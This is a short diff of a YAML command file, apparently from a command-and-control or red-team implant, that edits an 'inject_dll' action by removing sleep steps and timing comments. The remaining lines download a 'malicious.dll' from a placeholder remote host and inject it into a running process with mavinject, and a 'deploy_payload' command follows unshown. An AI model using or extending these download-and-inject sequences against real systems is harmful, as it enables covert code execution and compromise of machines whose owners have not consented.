@@ -21,21 +21,12 @@ commands:
 
   - command: inject_dll
     actions:
-        # set sleep to 1 at beginning, for rapid checkin/command execution
-      - command: sleep
-        args: 1
-
       - command: get_file
         args: http://someip/malicious.dll C:\malicious.dll
-
-        # potential problem, .dll may not be finished downloading in 1 sec sleep
 
       - command: start-process
         args: mavinject <PID> /INJECTRUNNING C:\malicious.dll
 
-        # set sleep back to 60 at end (or maybe have a mechanism for getting pior sleep time)
-      - command: sleep
-        args: 60
 
   - command: deploy_payload
     actions:
